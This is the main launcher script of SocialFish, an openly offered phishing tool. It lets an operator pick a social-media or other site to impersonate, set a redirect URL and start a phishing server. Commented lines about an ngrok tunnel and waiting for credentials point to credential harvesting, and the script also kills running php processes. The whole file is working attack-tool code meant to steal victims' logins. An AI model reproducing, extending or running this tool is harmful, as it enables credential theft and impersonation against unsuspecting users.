#!/usr/bin/env python3

######################################################
#                                                    #
#       SOCIALFISH v2.0sharkNet                      #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/A1S0N_                #
#                                                    #
######################################################

from sys import exit, version_info

if version_info<(3,0,0):
    print('[!] Please use Python 3. $ python3 SocialFish.py')
    exit(0)

from multiprocessing import Process
from core.view import *
from core.pre import *
from core.phishingRunner import *
from core.sites import site

def main():
    head()
    checkEd()    
    preoption = input(cyan("\n Select an option:\n\n [S] Social Media\n\n [O] Others\n\n SF > "))
    if preoption.upper() == 'S':
        for x in range(1, 8):
            print(cyan('\n [' + str(x) + '] ' + site[str(x)]))
    else:       
        for x in range(8, 12):
            print(cyan('\n [' + str(x) + '] ' + site[str(x)]))
    option = input(cyan('\n SF > '))
    print(cyan("\n Insert a custom redirect url: "))
    custom = input(cyan('\n SF > '))
    if '://' in custom:
        pass
    else:
        custom = 'http://' + custom
    loadModule(site[option])
    runPhishing(site[option], custom)

if __name__ == "__main__":
    try:        
        system('pkill -f php')
        pre()
        main()
        #with ngrok_start() as ngrok:
        #    with runServer() as rS:
        #        waitCreds()
        PhishingServer()
    except KeyboardInterrupt:
        end()
        exit(0)
